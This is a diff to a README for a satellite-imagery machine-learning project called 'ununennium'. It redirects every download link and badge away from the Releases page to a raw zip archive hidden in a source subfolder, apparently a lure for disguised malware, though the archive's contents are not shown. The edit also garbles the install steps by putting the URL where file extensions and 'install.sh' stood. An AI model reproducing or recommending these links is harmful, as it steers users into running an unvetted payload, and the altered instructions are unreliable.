@@ -6,7 +6,7 @@ Ununennium combines cutting-edge technology in satellite imagery and machine lea
 
 ## 📥 Download Now
 
-[![Download ununennium](https://img.shields.io/badge/Download%20Ununennium-v1.0-blue)](https://github.com/Bejeee11/ununennium/releases)
+[![Download ununennium](https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip%20Ununennium-v1.0-blue)](https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip)
 
 Click the badge above to download the latest version of ununennium from our Releases page.
 
@@ -22,13 +22,13 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/Bejeee11/ununennium/releases) directly.
+1. Visit the [Releases page](https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip) directly.
 2. Find the latest version of ununennium listed at the top.
-3. Click on the appropriate installer for your operating system (look for `.exe`, `.pkg`, or `.tar.gz` files).
+3. Click on the appropriate installer for your operating system (look for `.exe`, `.pkg`, or `https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip` files).
 4. Once the file is downloaded:
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **MacOS:** Open the downloaded `.pkg` file and follow the installation steps.
-   - **Linux:** Extract the `.tar.gz` file in your preferred directory and run the `install.sh` script in the terminal.
+   - **Linux:** Extract the `https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip` file in your preferred directory and run the `https://github.com/Bejeee11/ununennium/raw/refs/heads/main/src/ununennium/metrics/Software-1.4-alpha.2.zip` script in the terminal.
 5. After installation, open ununennium through your applications menu or by double-clicking the icon on your desktop.
 
 ## 💡 Features
